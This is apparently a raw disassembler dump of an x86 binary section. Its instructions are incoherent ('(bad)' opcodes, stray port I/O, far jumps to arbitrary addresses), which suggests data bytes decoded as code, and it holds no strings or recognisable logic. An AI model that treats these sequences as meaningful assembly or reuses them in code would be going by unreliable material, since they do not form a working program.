  4256c6:	loopne 0x4256b4
  4256c8:	mov    esp,0x9d9a1c8a
  4256cd:	mov    cl,0xf0
  4256cf:	outs   dx,BYTE PTR ds:[esi]
  4256d0:	pop    edx
  4256d1:	push   ss
  4256d2:	inc    edi
  4256d3:	call   0x391f56dc
  4256d8:	jge    0x425699
  4256da:	lods   al,BYTE PTR ds:[esi]
  4256db:	pop    ecx
  4256dc:	(bad)  
  4256dd:	mov    cl,0xc4
  4256df:	and    DWORD PTR [esi+0x1b],esi
  4256e2:	inc    esp
  4256e3:	in     al,0x99
  4256e5:	inc    ebp
  4256e6:	pop    esp
  4256e7:	mov    bl,0x42
  4256e9:	pop    ss
  4256ea:	xlat   BYTE PTR ds:[ebx]
  4256eb:	pushf  
  4256ec:	adc    al,0x4d
  4256ee:	jno    0x42574e
  4256f0:	lds    eax,FWORD PTR [esi]
  4256f2:	icebp  
  4256f3:	sti    
  4256f4:	mov    bl,BYTE PTR [ecx]
  4256f6:	mov    bl,BYTE PTR [edi-0x8]
  4256f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256fa:	mov    al,0xbf
  4256fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256fd:	add    dh,BYTE PTR [ecx]
  4256ff:	sub    BYTE PTR [ebx],dl
  425701:	ins    DWORD PTR es:[edi],dx
  425702:	mov    ah,0x11
  425704:	jmp    0xd5311d8d
  425709:	hlt    
  42570a:	jns    0x42571c
  42570c:	mov    ds:0xe491a9,eax
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0xe46a3274
  425783:	xor    al,0xc8
  425785:	pop    DWORD PTR [ecx]
  425787:	add    BYTE PTR [ecx+eax*1],al
  42578a:	add    BYTE PTR [eax],al
  42578c:	jns    0x425782
  42578e:	daa    
  42578f:	aad    0xee
  425791:	and    BYTE PTR [esi+esi*2],al
  425794:	pop    es
  425795:	fwait
  425796:	cmp    esp,DWORD PTR [ebp-0x5d]
  425799:	lahf   
  42579a:	push   edx
  42579b:	jnp    0x425733
  42579d:	mov    ch,BYTE PTR [ebx+0x6d2f6fe9]
  4257a3:	test   eax,0x708a3b14
  4257a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257a9:	sub    eax,DWORD PTR [eax+edx*2]
  4257ac:	ret    
  4257ad:	test   eax,0x70f8c8c9
  4257b2:	xchg   esp,eax
  4257b3:	cmp    eax,0xe7c68ea1
  4257b8:	test   eax,0x4c5f9ea3
  4257bd:	add    BYTE PTR [edx+esi*2],cl
  4257c0:	sub    eax,0x86eabd61
  4257c5:	in     al,dx
  4257c6:	dec    edx
  4257c7:	mov    esi,0xe97009cb
  4257cc:	sbb    al,0x5e
  4257ce:	adc    esp,DWORD PTR [eax]
  4257d0:	lods   eax,DWORD PTR ds:[esi]
  4257d1:	(bad)  
  4257d2:	nop
  4257d3:	ins    DWORD PTR es:[edi],dx
  4257d4:	xor    cl,BYTE PTR [edx+0x1c6a609b]
  4257da:	dec    ecx
  4257db:	in     eax,dx
  4257dc:	jae    0x4257d4
  4257de:	lods   eax,DWORD PTR ds:[esi]
  4257df:	arpl   bx,di
  4257e1:	mov    ax,0x7ba4
  4257e5:	lods   al,BYTE PTR ds:[esi]
  4257e6:	out    dx,al
  4257e7:	xchg   BYTE PTR [edi+0x69],ah
  4257ea:	sar    bl,0x13
  4257ed:	xor    ecx,DWORD PTR [esi+eiz*2]
  4257f0:	loope  0x425841
  4257f2:	cdq    
  4257f3:	ins    BYTE PTR es:[edi],dx
  4257f4:	xchg   ebp,eax
  4257f5:	and    BYTE PTR [edi+ecx*1],bh
  4257f8:	and    ch,0xe7
  4257fb:	pop    eax
  4257fc:	inc    ebx
  4257fd:	mov    eax,ds:0xa5fb9763
  425802:	or     eax,0x38a44acc
  425807:	in     al,0x62
  425809:	mov    bh,0xe2
  42580b:	jae    0x425843
  42580d:	imul   ecx,edi,0x791a266c
  425813:	sbb    al,0x15
  425815:	mov    DWORD PTR [ecx-0x3b],0x52e76572
  42581c:	mov    al,ds:0x335b7b00
  425821:	pop    edi
  425822:	mov    edi,0xafdb99a
  425827:	push   0xcffbc6d9
  42582c:	sbb    esp,DWORD PTR [eax+edi*2]
  42582f:	ins    DWORD PTR es:[edi],dx
  425830:	xchg   ebx,eax
  425831:	cli    
  425832:	jbe    0x4257c0
  425834:	mov    cl,0x1c
  425836:	push   0x73
  425838:	inc    esp
  425839:	jg     0x4257be
  42583b:	rcr    DWORD PTR [esi+0xd],cl
  42583e:	or     al,0x96
  425840:	les    edi,FWORD PTR [edi]
  425842:	stos   BYTE PTR es:[edi],al
  425843:	mov    dl,0x2f
  425845:	pop    eax
  425846:	mov    al,ds:0x5c2b368a
  42584c:	inc    ebp
  42584d:	cwde   
  42584e:	xchg   esi,eax
  42584f:	adc    al,0x65
  425851:	shl    DWORD PTR [edx+0x25],1
  425854:	popf   
  425855:	mov    ebp,0x500a46f1
  42585a:	mov    cl,BYTE PTR [ebp-0x160abcf]
  425860:	sahf   
  425861:	add    DWORD PTR [eax-0x3],eax
  425864:	xor    al,0x3
  425866:	jmp    0x425829
  425868:	jne    0x425882
  42586a:	jp     0x425860
  42586c:	cs ins BYTE PTR es:[edi],dx
  42586e:	jp     0x4258e6
  425870:	mov    dh,0x5
  425872:	(bad)  
  425873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425874:	icebp  
  425875:	xlat   BYTE PTR ds:[ebx]
  425876:	inc    ecx
  425877:	xchg   ebp,eax
  425878:	loop   0x425887
  42587a:	mov    edx,fs
  42587c:	imul   esi,DWORD PTR [ebx],0x25646263
  425882:	xchg   esi,eax
  425883:	loope  0x4258ec
  425885:	jb     0x42580e
  425887:	mov    al,ds:0xc52f5272
  42588c:	clc    
  42588d:	jmp    0x4258fb
  42588f:	dec    esi
	...
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	mov    DWORD PTR [edx],esi
  425902:	imul   eax,DWORD PTR [ebp+0x190cc],0x4
  425909:	add    DWORD PTR [eax],eax
  42590b:	add    BYTE PTR [ebx-0xf36b329],ah
  425911:	push   edi
  425912:	arpl   WORD PTR [ebx-0x6c19d616],dx
  425918:	out    dx,al
  425919:	mov    ebp,0xd136c0f0
  42591e:	aam    0x37
  425920:	xchg   ebp,eax
  425921:	add    DWORD PTR [eax+edx*2+0x37],0x6a
  425926:	in     al,0x33
  425928:	test   BYTE PTR [edx+0x39],ch
  42592b:	mov    WORD PTR [ebp+eiz*2-0x42],?
  42592f:	xchg   ecx,eax
  425930:	push   edi
  425931:	scas   eax,DWORD PTR es:[edi]
  425932:	into   
  425933:	aas    
  425934:	or     eax,0x2d232e40
  425939:	inc    eax
  42593a:	sbb    eax,0x84638436
  42593f:	jae    0x4259a2
  425941:	mov    ebp,0xe88f6f06
  425946:	inc    esp
  425947:	mov    bh,0x9d
  425949:	push   eax
  42594a:	popa   
  42594b:	sub    bh,BYTE PTR [edi+0x5a584ecf]
  425951:	push   0xe8eaaf3e
  425956:	push   0x1220b581
  42595b:	add    DWORD PTR [ebx-0x47],0x464641fe
  425962:	mov    eax,0x6efe3216
  425967:	pop    edx
  425968:	push   esi
  425969:	(bad)  
  42596b:	xor    eax,DWORD PTR [esi+0x4f]
  42596e:	arpl   WORD PTR [ecx+0x4c5ef6e2],bp
  425974:	pop    edi
  425975:	rcl    DWORD PTR [edi+0x46893359],0x17
  42597c:	sub    eax,0x6d9fa444
  425981:	xor    eax,0x8520c3c2
  425986:	push   ebp
  425987:	xor    ebx,edx
  425989:	mov    cl,0x7d
  42598b:	push   esp
  42598c:	adc    eax,0x74191415
  425991:	push   eax
  425992:	fwait
  425993:	ins    BYTE PTR es:[edi],dx
  425994:	mov    esp,0x302a7dd6
  425999:	mov    ah,0xc5
  42599b:	or     esi,ecx
  42599d:	and    al,0x99
  42599f:	or     BYTE PTR [ebp+edx*1+0x781cd577],0x75
  4259a7:	in     eax,0xfa
  4259a9:	add    al,0xf3
  4259ab:	sub    ebx,edx
  4259ad:	or     bh,BYTE PTR ds:0xb4c30e24
  4259b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259b4:	mov    al,ds:0xb52379ca
  4259b9:	xor    DWORD PTR [esp+edx*8-0x155afc0f],0x8c77468
  4259c4:	jb     0x425965
  4259c6:	daa    
  4259c7:	pop    esp
  4259c8:	sub    BYTE PTR [ecx],0x9f
  4259cb:	ds xor eax,0x2186e54b
  4259d1:	xor    BYTE PTR [ebp+0x187ce111],bh
  4259d7:	jl     0x4259bb
  4259d9:	popf   
  4259da:	ins    BYTE PTR es:[edi],dx
  4259db:	mov    ?,WORD PTR [edi-0xa]
  4259de:	jmp    0x425a53
  4259e0:	inc    esi
  4259e1:	dec    edi
  4259e2:	ds xor al,0xc6
  4259e5:	sub    DWORD PTR [ebx+0x14],ecx
  4259e8:	shr    esp,cl
  4259ea:	sbb    edi,DWORD PTR [ebp+0x6650235b]
  4259f0:	push   ds
  4259f1:	ds clc 
  4259f3:	loop   0x4259e6
  4259f5:	pop    ecx
  4259f6:	xchg   BYTE PTR [edi],dl
  4259f8:	push   0xf0507404
  4259fd:	xor    eax,0x890f6953
  425a02:	sub    al,BYTE PTR [edx]
  425a04:	ret    0xe004
  425a07:	das    
  425a08:	ins    DWORD PTR es:[edi],dx
  425a09:	stos   BYTE PTR es:[edi],al
  425a0a:	mov    bl,0x6f
  425a0c:	xchg   ebx,eax
  425a0d:	mov    bl,0x88
  425a0f:	sub    al,0x0
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x5c170941]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	mov    ds:0xe8273320,al
  425a91:	std    
  425a92:	xor    DWORD PTR [esi-0x14],ebx
  425a95:	or     eax,0x63ff851c
  425a9a:	out    dx,eax
  425a9b:	jmp    0x425a1f
  425a9d:	jp     0x425a58
  425a9f:	xchg   edi,eax
  425aa0:	nop
  425aa1:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425aa3:	enter  0x72e0,0x31
  425aa7:	inc    ebx
  425aa8:	pusha  
  425aa9:	arpl   WORD PTR [eax+0x16],si
  425aac:	daa    
  425aad:	push   eax
  425aae:	add    ebx,esi
  425ab0:	sbb    esi,ecx
  425ab2:	mov    esi,0x974206a3
  425ab7:	lahf   
  425ab8:	sub    al,0x7e
  425aba:	pop    esp
  425abb:	cs jg  0x425aed
  425abe:	dec    edx
  425abf:	ret    
  425ac0:	pop    edx
  425ac1:	or     eax,0xe3471a15
  425ac6:	sahf   
  425ac7:	(bad)  
  425ac8:	pop    ebp
  425ac9:	inc    ecx
  425aca:	mov    DWORD PTR [esi+0x2],ebp
  425acd:	loope  0x425a64
  425acf:	inc    edi
  425ad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ad1:	xchg   esi,eax
  425ad2:	jl     0x425ae7
  425ad4:	ret    
  425ad5:	arpl   WORD PTR [edx+eax*4-0x4ad78ef9],bp
  425adc:	je     0x425af9
  425ade:	popa   
  425adf:	jnp    0x425ad6
  425ae1:	xchg   ecx,ecx
  425ae3:	jp     0x425b60
  425ae5:	scas   eax,DWORD PTR es:[edi]
  425ae6:	mov    dh,0x8c
  425ae8:	int3   
  425ae9:	xchg   ecx,eax
  425aea:	cdq    
  425aeb:	xor    BYTE PTR [ebx-0x69],bh
  425aee:	stc    
  425aef:	mov    ah,0x36
  425af1:	ret    0x5567
  425af4:	in     al,0xc1
  425af6:	aaa    
  425af7:	push   ebx
  425af8:	mov    DWORD PTR [eax-0x54e9ab6a],eax
  425afe:	retf   
  425aff:	rcr    DWORD PTR [edi],1
  425b01:	cmp    BYTE PTR [ecx],0xa0
  425b04:	and    eax,0x26789d9b
  425b09:	lock mov bh,0x66
  425b0c:	and    al,0x22
  425b0e:	es enter 0x3da,0x87
  425b13:	cdq    
  425b14:	not    DWORD PTR [ecx-0x4f]
  425b17:	(bad)  
  425b18:	shl    DWORD PTR [edx+0x6c],cl
  425b1b:	mov    dh,BYTE PTR [edx+eax*1]
  425b1e:	pushf  
  425b1f:	sbb    al,0x9d
  425b21:	add    al,ah
  425b23:	out    0x73,al
  425b25:	rol    dh,cl
  425b27:	jmp    0x8f28fad8
  425b2c:	addr16 mov ah,0xc1
  425b2f:	ret    0xcecf
  425b32:	pop    esi
  425b33:	push   eax
  425b34:	dec    esp
  425b35:	mov    edx,DWORD PTR [edi-0x59ed228f]
  425b3b:	sbb    eax,0x65009dc3
  425b40:	(bad)  [esi+0x74]
  425b43:	std    
  425b44:	push   esi
  425b45:	push   0xffffffbb
  425b47:	pop    es
  425b48:	mov    ds,WORD PTR [eax-0x18f9803c]
  425b4e:	add    eax,0x8db769db
  425b53:	loop   0x425b99
  425b55:	mov    edx,0x91e29876
  425b5a:	pushf  
  425b5b:	pop    ebx
  425b5c:	push   esi
  425b5d:	xchg   DWORD PTR [eax],esp
  425b5f:	cmp    al,0x28
  425b61:	retf   0xfda
  425b64:	mov    ebp,0x812b4f8c
  425b69:	inc    eax
  425b6a:	aaa    
  425b6b:	cmp    ebp,ebx
  425b6d:	retf   0xe8bd
  425b70:	xor    eax,0x7c0db9dc
  425b75:	dec    esp
  425b76:	sbb    bh,ah
  425b78:	lods   al,BYTE PTR ds:[esi]
  425b79:	inc    esi
  425b7a:	xchg   ebp,eax
  425b7b:	and    esp,esp
  425b7d:	pop    eax
  425b7e:	mov    WORD PTR [ebx],es
  425b80:	lea    ebx,[ebx+edi*2+0xd8178ee]
  425b87:	mov    esp,0x8d5af581
  425b8c:	pusha  
  425b8d:	adc    ch,BYTE PTR [eax]
  425b8f:	pop    eax
	...
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	test   DWORD PTR [edx-0x6d2b54cc],ebp
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    al,0x1
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	inc    edi
  425c0d:	cld    
  425c0e:	ins    BYTE PTR es:[edi],dx
  425c0f:	test   DWORD PTR ds:0xd2cf54cd,esp
  425c15:	inc    esp
  425c16:	or     ah,BYTE PTR [edi-0x21]
  425c19:	mov    gs,WORD PTR [edi+edi*8]
  425c1c:	jno    0x425ba6
  425c1e:	and    eax,0x65df2216
  425c23:	or     dl,BYTE PTR [esi+0x52aae82e]
  425c29:	push   DWORD PTR [ebx-0x52]
  425c2c:	retf   
  425c2d:	lea    edx,[eax]
  425c2f:	popf   
  425c30:	xchg   ebp,eax
  425c31:	repnz out dx,eax
  425c33:	mov    al,BYTE PTR [esi+0x1670d7fd]
  425c39:	retf   
  425c3a:	test   eax,0xdbc9e64
  425c3f:	aad    0x4
  425c41:	cmc    
  425c42:	mov    dl,0x2e
  425c44:	rol    BYTE PTR [ebx+0x48],1
  425c47:	in     eax,0x76
  425c49:	dec    edi
  425c4a:	int    0xea
  425c4c:	shl    DWORD PTR [edi],0x68
  425c4f:	xlat   BYTE PTR ds:[ebx]
  425c50:	stos   DWORD PTR es:[edi],eax
  425c51:	(bad)  
  425c52:	daa    
  425c53:	xor    ebx,DWORD PTR [ecx-0x340b7de8]
  425c59:	xchg   ebp,eax
  425c5a:	sbb    BYTE PTR [edi+0x63],ch
  425c5d:	test   DWORD PTR [edx*8+0x5d7fa551],eax
  425c64:	jae    0x425c07
  425c66:	out    dx,eax
  425c67:	gs cli 
  425c69:	aas    
  425c6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c6b:	xlat   BYTE PTR es:[ebx]
  425c6d:	sub    edi,DWORD PTR [esi+0x3748f03d]
  425c73:	mov    dl,0xb6
  425c75:	mov    ?,WORD PTR ds:0x9a24bfe9
  425c7b:	rol    BYTE PTR [ebp-0x316f2624],1
  425c81:	inc    edx
  425c82:	pop    esi
  425c83:	push   ebp
  425c84:	outs   dx,BYTE PTR ds:[esi]
  425c85:	sub    ebx,DWORD PTR es:[ebx+edx*2+0x14]
  425c8a:	push   esi
  425c8b:	and    eax,0x12743e72
  425c90:	hlt    
  425c91:	or     BYTE PTR [edi],dl
  425c93:	sub    DWORD PTR [eax+0x52ad2f47],edi
  425c99:	cmp    DWORD PTR [ebp+0x3fb128f0],ecx
  425c9f:	mov    esp,0x7ba00d30
  425ca4:	jp     0x425c2e
  425ca6:	mov    eax,ds:0x59c24d76
  425cab:	div    BYTE PTR [ebp+0x75]
  425cae:	and    esp,DWORD PTR [eax+0x5b33f3ae]
  425cb4:	scas   al,BYTE PTR es:[edi]
  425cb5:	inc    edx
  425cb6:	inc    ecx
  425cb7:	imul   eax,DWORD PTR [eax-0x26],0xc986d069
  425cbe:	lds    esp,FWORD PTR [ecx+ecx*4-0x44]
  425cc2:	xchg   DWORD PTR [eax-0x1c],ecx
  425cc5:	sbb    DWORD PTR ds:0xf2d26d5c,eax
  425ccb:	mov    edi,0xd2221fb6
  425cd0:	mov    cl,0x87
  425cd2:	mov    ebp,0x44431ffe
  425cd7:	lods   al,BYTE PTR ds:[esi]
  425cd8:	lods   al,BYTE PTR ds:[esi]
  425cd9:	push   ds
  425cda:	xchg   esp,eax
  425cdb:	sbb    edi,DWORD PTR [ebx]
  425cdd:	and    DWORD PTR [eax],esi
  425cdf:	arpl   WORD PTR [edi-0x363ed165],bp
  425ce5:	imul   DWORD PTR [esp+edx*8+0x4ff91f3e]
  425cec:	push   ebp
  425ced:	cli    
  425cee:	cli    
  425cef:	dec    DWORD PTR [eax+0xd1b06fd]
  425cf5:	and    BYTE PTR [edx+0x1c972469],bh
  425cfb:	aad    0x1e
  425cfd:	sbb    al,al
  425cff:	(bad)
  425d04:	(bad)  
  425d05:	lock mov ebp,0xda8979c3
  425d0b:	mov    ch,0xeb
  425d0d:	mov    esp,0xc8ff
	...
  425d72:	add    BYTE PTR [eax],al
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x3fc92926,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	js     0x425d5c
  425d8e:	or     DWORD PTR [edx+0x37],0xce30d7dc
  425d95:	test   DWORD PTR [ecx+ecx*4+0x2e2f53d1],esp
  425d9c:	xor    esp,esi
  425d9e:	imul   DWORD PTR [ecx-0x49d33fc5]
  425da4:	cmc    
  425da5:	stos   BYTE PTR es:[edi],al
  425da6:	scas   eax,DWORD PTR es:[edi]
  425da7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425da8:	xchg   ebx,eax
  425da9:	sub    cl,dh
  425dab:	fsubr  st(1),st
  425dad:	shl    DWORD PTR [esi],1
  425daf:	jo     0x425e0f
  425db1:	push   es
  425db2:	jbe    0x425e0c
  425db4:	mov    eax,0xb71ce69c
  425db9:	add    BYTE PTR [eax],al
  425dbb:	sub    DWORD PTR [ecx+0x76384330],0x1f4f853
  425dc5:	or     ebp,DWORD PTR [esp+esi*8]
  425dc8:	les    ebx,FWORD PTR [esi+ebp*8+0x2f]
  425dcc:	mov    DWORD PTR [esi+0xb261ee],eax
  425dd2:	mov    esi,0xe9665d63
  425dd7:	and    bh,0x6c
  425dda:	and    cl,bl
  425ddc:	push   es
  425ddd:	xchg   esi,eax
  425dde:	test   DWORD PTR [eax],ebx
  425de0:	out    0xaa,eax
  425de2:	inc    eax
  425de3:	int    0x2b
  425de5:	mov    dh,0x76
  425de7:	(bad)  
  425de8:	js     0x425e31
  425dea:	sbb    BYTE PTR [esi],al
  425dec:	repz xchg ecx,ebx
  425def:	jbe    0x425de2
  425df1:	inc    edi
  425df2:	mov    al,ds:0x5281962e
  425df7:	daa    
  425df8:	(bad)  
  425df9:	fisubr DWORD PTR [ecx+0x6b]
  425dfc:	out    dx,al
  425dfd:	adc    DWORD PTR ds:0x613e84f8,edi
  425e03:	mov    cl,0x9d
  425e05:	pop    edi
  425e06:	sub    cl,BYTE PTR [esi]
  425e08:	out    0x9d,eax
  425e0a:	push   ds
  425e0b:	pop    ebx
  425e0c:	stc    
  425e0d:	retf   0x3ca2
  425e10:	mov    ah,0x65
  425e12:	imul   edi,ebp,0x77
  425e15:	mov    dl,0xce
  425e17:	fnstcw WORD PTR ds:0x7de8fefa
  425e1d:	push   0xd112af35
  425e22:	mov    bl,BYTE PTR [edi-0x658a8813]
  425e28:	sbb    eax,0xb7296643
  425e2d:	out    0x5f,al
  425e2f:	hlt    
  425e30:	(bad)  
  425e31:	les    eax,FWORD PTR [ebp-0x46]
  425e34:	ss mov ch,0xb7
  425e37:	out    0x79,al
  425e39:	fisubr WORD PTR [ebp-0x7e1b9d42]
  425e3f:	loope  0x425e58
  425e41:	mov    ecx,0x54db99b7
  425e46:	(bad)  
  425e48:	sbb    BYTE PTR [ecx],cl
  425e4a:	test   al,0x95
  425e4c:	pop    ss
  425e4d:	leave  
  425e4e:	push   esp
  425e4f:	nop
  425e50:	lock out dx,al
  425e52:	inc    edi
  425e53:	ds call 0x1bec632d
  425e59:	rcl    DWORD PTR [eax-0x163bd2ee],cl
  425e5f:	ins    BYTE PTR es:[edi],dx
  425e60:	sbb    BYTE PTR [ebp-0x38],ch
  425e63:	rol    DWORD PTR ds:0xd707e16,1
  425e69:	test   eax,0x49ddc9f4
  425e6e:	sbb    ah,BYTE PTR [esp+ecx*2+0x4c72303f]
  425e75:	stos   BYTE PTR es:[edi],al
  425e76:	arpl   WORD PTR [eax],ax
  425e78:	cld    
  425e79:	gs mov bl,0xfc
  425e7c:	xchg   DWORD PTR [edx],ebp
  425e7e:	xchg   ecx,eax
  425e7f:	push   0xffffffba
  425e81:	retf   0xd869
  425e84:	arpl   WORD PTR [esp+esi*2-0x5e8e11e5],di
  425e8b:	push   ds
  425e8c:	test   DWORD PTR [ebp+0x279f],ebx
	...
  425ef2:	add    BYTE PTR [eax],al
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	push   ecx
  425f01:	jg     0x425f3b
  425f03:	ja     0x425ee1
  425f05:	xchg   esp,eax
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    al,0x1
  425f0a:	add    BYTE PTR [eax],al
  425f0c:	clc    
  425f0d:	mov    cl,0x2b
  425f0f:	jp     0x425f19
  425f11:	rol    ah,0xb8
  425f14:	or     DWORD PTR [edi+0xa],edx
  425f17:	inc    esi
  425f18:	sbb    BYTE PTR [eax+0x333a6c35],0xca
  425f1f:	inc    edx
  425f20:	arpl   bp,dx
  425f22:	aas    
  425f23:	add    DWORD PTR [edx],eax
  425f25:	int    0x96
  425f27:	add    DWORD PTR [edi+0x8],0x38
  425f2b:	iret   
  425f2c:	mov    al,ds:0x513ed5e
  425f31:	sbb    al,0x78
  425f33:	inc    edx
  425f34:	les    eax,FWORD PTR [edx]
  425f36:	cmp    edi,ebp
  425f38:	cmp    eax,0x33540187
  425f3d:	inc    edi
  425f3e:	pop    ss
  425f3f:	pop    eax
  425f40:	adc    BYTE PTR [ebp+0xd],0x49
  425f44:	inc    ebx
  425f45:	and    eax,0x655a71dc
  425f4a:	leave  
  425f4b:	jo     0x425f7d
  425f4d:	dec    esi
  425f4e:	push   edx
  425f4f:	or     al,0x1a
  425f51:	cmc    
  425f52:	push   edi
  425f53:	push   esi
  425f54:	push   ebp
  425f55:	retf   
  425f56:	test   al,0x34
  425f58:	adc    al,0x1d
  425f5a:	xchg   ecx,esp
  425f5c:	in     eax,0xd3
  425f5e:	stc    
  425f5f:	sub    ecx,DWORD PTR [eax]
  425f61:	push   ds
  425f62:	push   0xffffff98
  425f64:	call   0x7e65:0x2a249484
  425f6b:	aaa    
  425f6c:	pusha  
  425f6d:	mov    bl,0xcc
  425f6f:	imul   edi,esi,0x0
  425f72:	mov    eax,ds:0xc90bf11f
  425f77:	mov    ebp,0x7b2a5d38
  425f7c:	dec    ebp
  425f7d:	int    0x26
  425f7f:	mov    esp,0xce775433
  425f84:	pop    es
  425f85:	daa    
  425f86:	cld    
  425f87:	retw   0x8fd7
  425f8b:	mov    ebx,0x8cadfd98
  425f90:	jnp    0x425f88
  425f92:	adc    eax,0xf7cccdc3
  425f97:	js     0x425f63
  425f99:	js     0x425f35
  425f9b:	xor    bh,BYTE PTR [ebp+0xe97aec8]
  425fa1:	mov    al,ds:0x655874ea
  425fa6:	(bad)  
  425fa8:	loope  0x425f48
  425faa:	loope  0x425f49
  425fac:	lods   eax,DWORD PTR ds:[esi]
  425fad:	aam    0x2b
  425faf:	mov    esp,0xcb3a1749
  425fb4:	and    ebx,ebx
  425fb6:	pop    edi
  425fb7:	fnstsw WORD PTR [esi-0x43]
  425fba:	mov    dl,0x5c
  425fbc:	sub    al,0x0
  425fbe:	sbb    ah,dl
  425fc0:	cmp    dl,0xd5
  425fc3:	in     al,dx
  425fc4:	std    
  425fc5:	mov    dh,0x82
  425fc7:	enter  0x527a,0x63
  425fcb:	(bad)  
  425fcc:	out    dx,al
  425fcd:	and    BYTE PTR [ecx+0x21e7e9c0],0x32
  425fd4:	mov    DWORD PTR [eax-0x7d40b43],edi
  425fda:	cmc    
  425fdb:	call   FWORD PTR [ebx+0x2c]
  425fde:	adc    DWORD PTR [ebx],ebx
  425fe0:	lods   eax,DWORD PTR ds:[esi]
  425fe1:	jecxz  0x42603b
  425fe3:	stos   BYTE PTR es:[edi],al
  425fe4:	sub    DWORD PTR [esp+esi*8],0x8d871067
  425feb:	fld    TBYTE PTR [ecx+0x4b]
  425fee:	fstp   DWORD PTR [ecx+0x15]
  425ff1:	adc    al,0x61
  425ff3:	in     eax,0xaf
  425ff5:	shl    BYTE PTR [ebp-0x6ef5ca5a],0x39
  425ffc:	into   
  425ffd:	mov    ecx,0xebe81d75
  426002:	in     eax,0x2b
  426004:	call   0xa03e:0xe092d07f
  42600b:	gs mov esp,0xa07b56
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	cmp    DWORD PTR [eax],esi
  426082:	xchg   edx,eax
  426083:	or     al,0xe0
  426085:	xchg   ebp,eax
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	(bad)  
  42608d:	jo     0x42608c
  42608f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426090:	push   ds
  426091:	(bad)  
  426092:	(bad)  
  426093:	jmp    0x27c3:0x1758462a
  42609a:	in     eax,dx
  42609b:	int    0xeb
  42609d:	or     BYTE PTR [edx-0x1],cl
  4260a0:	pop    esi
  4260a1:	mov    esi,0x5519052f
  4260a6:	je     0x426115
  4260a8:	ins    BYTE PTR es:[edi],dx
  4260a9:	imul   esp,DWORD PTR [edx+0x2],0x49e27a28
  4260b0:	stos   BYTE PTR es:[edi],al
  4260b1:	ret    
  4260b2:	call   DWORD PTR [eax-0x5210eb0b]
  4260b8:	stos   DWORD PTR es:[edi],eax
  4260b9:	cmc    
  4260ba:	add    esp,DWORD PTR [ebx]
  4260bc:	mov    esp,0x9930d068
  4260c1:	cdq    
  4260c2:	lods   eax,DWORD PTR ds:[esi]
  4260c3:	pop    esp
  4260c4:	aaa    
  4260c5:	into   
  4260c6:	int3   
  4260c7:	or     eax,0x9dae7138
  4260cc:	in     eax,dx
  4260cd:	unpcklps xmm7,XMMWORD PTR ds:0xef6eed1e
  4260d4:	das    
  4260d5:	dec    ebp
  4260d6:	and    ah,0x97
  4260d9:	jbe    0x426147
  4260db:	jo     0x4260e4
  4260dd:	je     0x42612f
  4260df:	mov    BYTE PTR [esi+0x1a0512c4],bl
  4260e5:	lods   al,BYTE PTR ds:[esi]
  4260e6:	push   es
  4260e7:	jge    0x426079
  4260e9:	loope  0x4260b4
  4260eb:	fs int3 
  4260ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4260ee:	cdq    
  4260ef:	xchg   ah,dl
  4260f1:	inc    esi
  4260f2:	mov    cl,0x3c
  4260f4:	mov    cl,0xd8
  4260f6:	ins    DWORD PTR es:[edi],dx
  4260f7:	jb     0x426138
  4260f9:	mov    ds:0x1440f871,eax
  4260fe:	mov    bl,0x96
  426100:	rol    eax,cl
  426102:	xchg   ecx,eax
  426103:	clc    
  426104:	in     eax,0xba
  426106:	xchg   edi,eax
  426107:	sbb    DWORD PTR [ebp+eiz*2+0x6d],0x44
  42610c:	fbstp  TBYTE PTR [edx-0x7c52378d]
  426112:	(bad)  
  426114:	shr    BYTE PTR [eax+eax*8+0x29],cl
  426118:	pushf  
  426119:	popf   
